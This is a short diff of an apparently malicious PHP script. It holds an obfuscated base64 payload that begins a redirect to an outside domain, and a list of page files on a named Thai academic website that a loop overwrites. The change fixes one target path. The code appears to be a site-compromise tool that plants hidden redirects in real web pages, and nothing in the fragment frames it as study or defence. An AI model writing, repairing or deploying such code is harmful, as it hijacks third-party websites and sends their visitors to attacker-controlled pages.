@@ -6,7 +6,7 @@ $base64_code = 'PD9waHAKJHJlZGlyZWN0X3VybCA9ICJodHRwczovL3Vsb3NiYXRhay5saWZlL2tv
 $target_files = [
     '/home/tipnuada/domains/tipnuad.ac.th/public_html/amss/video.php',
     '/home/tipnuada/domains/tipnuad.ac.th/public_html/video.php',
-    '/home/tipnuada/domains/tipnuad.ac.th/public_html/product.php?'
+    '/home/tipnuada/domains/tipnuad.ac.th/public_html/product.php'
 ];
 
 // Loop untuk menimpa semua file
